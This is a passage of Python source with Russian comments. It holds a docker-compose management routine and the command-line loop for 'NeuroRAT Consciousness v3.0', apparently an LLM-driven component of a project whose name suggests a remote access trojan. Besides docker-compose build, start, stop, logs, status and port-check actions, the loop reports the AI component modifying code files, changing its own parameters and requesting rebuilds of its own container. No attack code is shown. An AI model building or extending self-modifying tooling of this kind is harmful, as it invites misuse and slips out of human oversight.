            for _ in range(3):  # Проверяем 3 уровня вверх
                parent_dir = os.path.dirname(current_dir)
                if parent_dir == current_dir:  # Достигли корня файловой системы
                    break
                current_dir = parent_dir
                compose_path = os.path.join(current_dir, compose_file)
                if os.path.exists(compose_path):
                    compose_file = compose_path
                    break
        
        if not os.path.exists(compose_file):
            logger.error(f"Файл docker-compose.yml не найден")
            return {"status": "error", "message": "Файл docker-compose.yml не найден"}
            
        logger.info(f"Используется файл {compose_file}")
        
        # Получаем список доступных сервисов
        try:
            services_cmd = ["docker-compose", "-f", compose_file, "config", "--services"]
            services_result = subprocess.run(services_cmd, check=True, capture_output=True, text=True)
            available_services = services_result.stdout.strip().split('\n')
            logger.info(f"Доступные сервисы: {', '.join(available_services)}")
            
            # Проверяем, что указанный контейнер существует
            if container_name and container_name not in available_services:
                logger.warning(f"Сервис {container_name} не найден среди доступных: {', '.join(available_services)}")
                return {"status": "error", "message": f"Сервис {container_name} не найден среди доступных: {', '.join(available_services)}"}
        except Exception as e:
            logger.warning(f"Не удалось получить список сервисов: {str(e)}")
            # Продолжаем выполнение, так как это не критическая ошибка
        
        # Выполнение запрошенного действия
        result = {"status": "success", "action": action, "output": "", "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        
        def run_command(cmd, capture_output=True, show_output=True):
            cmd_str = " ".join(cmd)
            logger.info(f"Выполнение команды: {cmd_str}")
            
            try:
                if capture_output:
                    process = subprocess.run(cmd, check=True, capture_output=True, text=True)
                    output = process.stdout
                    if show_output and output:
                        for line in output.splitlines():
                            logger.info(f"STDOUT: {line}")
                    return {"status": "success", "output": output}
                else:
                    # Для команд, которые нужно запустить в интерактивном режиме
                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    output_lines = []
                    
                    for line in process.stdout:
                        output_line = line.strip()
                        if show_output:
                            logger.info(f"STDOUT: {output_line}")
                        output_lines.append(output_line)
                        
                    process.wait()
                    return {"status": "success", "output": "\n".join(output_lines)}
            except subprocess.CalledProcessError as e:
                logger.error(f"Ошибка при выполнении команды: {str(e)}")
                stderr = e.stderr if hasattr(e, "stderr") else ""
                if stderr:
                    for line in stderr.splitlines():
                        logger.error(f"STDERR: {line}")
                return {"status": "error", "message": str(e), "stderr": stderr}
        
        try:
            if action == "build":
                # Сборка контейнеров
                cmd = ["docker-compose", "-f", compose_file, "build"]
                if container_name:
                    cmd.append(container_name)
                    
                cmd_result = run_command(cmd)
                result["output"] = cmd_result["output"]
                result["status"] = cmd_result["status"]
                
                if result["status"] == "success":
                    logger.info(f"Сборка {'всех контейнеров' if not container_name else f'контейнера {container_name}'} успешно завершена")
                
            elif action == "start":
                # Запуск контейнеров
                cmd = ["docker-compose", "-f", compose_file, "up"]
                if detached:
                    cmd.append("-d")
                if container_name:
                    cmd.append(container_name)
                    
                cmd_result = run_command(cmd)
                result["output"] = cmd_result["output"]
                result["status"] = cmd_result["status"]
                
                if result["status"] == "success":
                    logger.info(f"Запуск {'всех контейнеров' if not container_name else f'контейнера {container_name}'} успешно выполнен")
                
            elif action == "stop":
                # Остановка контейнеров
                cmd = ["docker-compose", "-f", compose_file, "stop"]
                if container_name:
                    cmd.append(container_name)
                    
                cmd_result = run_command(cmd)
                result["output"] = cmd_result["output"]
                result["status"] = cmd_result["status"]
                
                if result["status"] == "success":
                    logger.info(f"Остановка {'всех контейнеров' if not container_name else f'контейнера {container_name}'} успешно выполнена")
                
            elif action == "restart":
                # Перезапуск контейнеров
                cmd = ["docker-compose", "-f", compose_file, "restart"]
                if container_name:
                    cmd.append(container_name)
                    
                cmd_result = run_command(cmd)
                result["output"] = cmd_result["output"]
                result["status"] = cmd_result["status"]
                
                if result["status"] == "success":
                    logger.info(f"Перезапуск {'всех контейнеров' if not container_name else f'контейнера {container_name}'} успешно выполнен")
                
            elif action == "logs":
                # Получение логов контейнера
                cmd = ["docker-compose", "-f", compose_file, "logs"]
                if tail:
                    cmd.extend(["--tail", str(tail)])
                if follow:
                    cmd.append("-f")
                if container_name:
                    cmd.append(container_name)
                    
                if follow:
                    # Для логов с отслеживанием в реальном времени используем отдельную обработку
                    cmd_result = run_command(cmd, capture_output=False, show_output=True)
                else:
                    cmd_result = run_command(cmd)
                    
                result["output"] = cmd_result["output"]
                result["status"] = cmd_result["status"]
                
            elif action == "status":
                # Получение статуса контейнеров
                cmd = ["docker-compose", "-f", compose_file, "ps"]
                cmd_result = run_command(cmd)
                result["output"] = cmd_result["output"]
                result["status"] = cmd_result["status"]
                
                # Дополнительно показываем информацию о сети
                try:
                    network_cmd = ["docker", "network", "inspect", "neurorat-network"]
                    network_result = subprocess.run(network_cmd, check=True, capture_output=True, text=True)
                    try:
                        network_data = json.loads(network_result.stdout)
                        if network_data:
                            network_info = {
                                "name": network_data[0].get("Name"),
                                "driver": network_data[0].get("Driver"),
                                "containers": {}
                            }
                            
                            for container_id, container_info in network_data[0].get("Containers", {}).items():
                                network_info["containers"][container_info.get("Name")] = {
                                    "id": container_id,
                                    "ipv4": container_info.get("IPv4Address"),
                                    "ipv6": container_info.get("IPv6Address", "")
                                }
                                
                            result["network_info"] = network_info
                            logger.info(f"Получена информация о сети {network_info['name']} ({network_info['driver']}), контейнеров: {len(network_info['containers'])}")
                    except json.JSONDecodeError:
                        logger.error(f"Не удалось разобрать JSON из ответа о сети")
                except Exception as e:
                    logger.warning(f"Не удалось получить информацию о сети: {str(e)}")
                
            elif action == "check-ports":
                # Проверка доступности портов
                result["ports_status"] = {}
                default_ports = [8080, 5001]  # Порты по умолчанию для сервера NeuroRAT
                
                logger.info(f"Проверка доступности портов...")
                
                for port in default_ports:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    
                    # Пробуем подключиться к localhost на указанном порту
                    socket_result = sock.connect_ex(("localhost", port))
                    sock.close()
                    
                    status = "открыт" if socket_result == 0 else "закрыт"
                    result["ports_status"][port] = status
                    logger.info(f"Порт {port}: {status}")
                
            elif action == "rebuild":
                # Комбинированное действие: пересборка и перезапуск
                # Сначала выполняем сборку
                build_cmd = ["docker-compose", "-f", compose_file, "build"]
                if container_name:
                    build_cmd.append(container_name)
                
                build_result = run_command(build_cmd)
                result["build_output"] = build_result["output"]
                result["build_status"] = build_result["status"]
                
                if build_result["status"] == "success":
                    # Если сборка успешна, перезапускаем контейнеры
                    restart_cmd = ["docker-compose", "-f", compose_file, "up", "-d"]
                    if container_name:
                        restart_cmd.append(container_name)
                        
                    restart_result = run_command(restart_cmd)
                    result["restart_output"] = restart_result["output"]
                    result["restart_status"] = restart_result["status"]
                    
                    if restart_result["status"] == "success":
                        logger.info(f"Пересборка и перезапуск {'всех контейнеров' if not container_name else f'контейнера {container_name}'} успешно выполнены")
                        result["status"] = "success"
                    else:
                        logger.error(f"Пересборка успешна, но перезапуск не удался")
                        result["status"] = "partial_success"
                else:
                    logger.error(f"Ошибка при пересборке контейнера")
                    result["status"] = "error"
                
            else:
                logger.error(f"Неизвестное действие: {action}")
                result = {"status": "error", "message": f"Неизвестное действие: {action}"}
                
        except Exception as e:
            logger.error(f"Ошибка при выполнении действия {action}: {str(e)}")
            return {
                "status": "error", 
                "message": f"Ошибка при выполнении действия {action}: {str(e)}"
            }
            
        logger.info(f"Операция {action} завершена со статусом: {result['status']}")
        return result

def main():
    """Основная функция"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║          ███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗         ║
║          ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗        ║
║          ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║        ║
║          ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║        ║
║          ██║ ╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝        ║
║          ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝         ║
║                                                              ║
║             ██████╗  █████╗ ████████╗                        ║
║             ██╔══██╗██╔══██╗╚══██╔══╝                        ║
║             ██████╔╝███████║   ██║                           ║
║             ██╔══██╗██╔══██║   ██║                           ║
║             ██║  ██║██║  ██║   ██║                           ║
║             ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                           ║
║                                                              ║
║                  CONSCIOUSNESS v3.0                          ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    print("Initializing NeuroRAT Consciousness...")
    consciousness = NeuroRATConsciousness()
    print("Consciousness initialized!")
    
    print("\nType your message to interact with NeuroRAT. Type 'exit' to quit.")
    print("Special commands:")
    print("  !help     - Show available commands")
    print("  !advanced - Toggle advanced mode")
    print("  !temp X   - Set temperature (0.1-1.0)")
    print("  !export   - Export conversation history")
    print("  !code     - Show code analysis summary")
    print("  !rebuild  - Request container rebuild")
    
    while True:
        try:
            user_input = input("\n> ")
            
            # Проверяем специальные команды
            if user_input.lower() == "exit":
                print("Shutting down consciousness...")
                break
            elif user_input.lower() == "!help":
                print("\nAvailable commands:")
                print("  !help     - Show this help")
                print("  !advanced - Toggle advanced mode (current: " + ("ON" if consciousness.advanced_mode else "OFF") + ")")
                print("  !temp X   - Set temperature (current: " + str(consciousness.temperature) + ")")
                print("  !export   - Export conversation history")
                print("  !code     - Show code analysis summary")
                print("  !rebuild  - Request container rebuild")
                print("  exit      - Quit the program")
                continue
            elif user_input.lower() == "!advanced":
                consciousness.advanced_mode = not consciousness.advanced_mode
                print(f"Advanced mode: {'ON' if consciousness.advanced_mode else 'OFF'}")
                continue
            elif user_input.lower().startswith("!temp "):
                try:
                    new_temp = float(user_input.split(" ")[1])
                    if 0.1 <= new_temp <= 1.0:
                        consciousness.temperature = new_temp
                        print(f"Temperature set to: {new_temp}")
                    else:
                        print("Temperature must be between 0.1 and 1.0")
                except:
                    print("Invalid temperature format. Use !temp 0.7")
                continue
            elif user_input.lower() == "!export":
                with open(f"neurorat_convo_{int(time.time())}.json", "w") as f:
                    json.dump(consciousness.history, f, indent=2)
                print("Conversation exported to file.")
                continue
            elif user_input.lower() == "!code":
                code_analysis = consciousness.code_analysis
                print("\nCode Analysis Summary:")
                print(f"Files found: {len(code_analysis.get('files', []))}")
                print(f"Classes found: {len(code_analysis.get('classes', {}))}")
                print(f"Functions found: {len(code_analysis.get('functions', {}))}")
                print("\nCapabilities:")
                for cap in code_analysis.get("capabilities", []):
                    print(f"- {cap}")
                continue
            elif user_input.lower() == "!rebuild":
                success, output = consciousness.rebuild_container()
                print(f"\n{'Success' if success else 'Error'}: {output}")
                continue
            
            print("\nThinking...")
            response, execution_results = consciousness.interact(user_input)
            
            print("\n" + response)
            
            # Если были выполнены команды, показываем их результаты
            if execution_results:
                print("\nExecution Results:")
                for result in execution_results:
                    if result["type"] == "profile":
                        status = "✓" if result["success"] else "✗"
                        print(f"\n[PROFILE {status}] {result['parameter']} → {result['value']}")
                        print(f"Result: {result['output']}")
                    elif result["type"] == "rebuild":
                        print(f"\n[REBUILD REQUEST ⚠️] {result['command']}")
                        print(f"Result: {result['output']}")
                    elif result["type"] == "modify":
                        print(f"\n[CODE MODIFICATION ⚠️] {result['file']}")
                        print(f"Result: {result['output']}")
                    elif result["type"] == "show_code":
                        print(f"\n[CODE VIEW {'✓' if result['success'] else '✗'}] {result['file']}")
                        if result['success']:
                            output = result['output']
                            if len(output) > 1000:
                                print(f"Content (first 1000 chars): {output[:1000]}...")
                                print(f"...and {len(output)-1000} more characters")
                            else:
                                print(f"Content: {output}")
                        else:
                            print(f"Error: {result['output']}")
        
        except KeyboardInterrupt:
            print("\nInterrupted by user. Shutting down...")
            break
        
        except Exception as e:
            print(f"\nError: {e}")

if __name__ == "__main__":
    main()
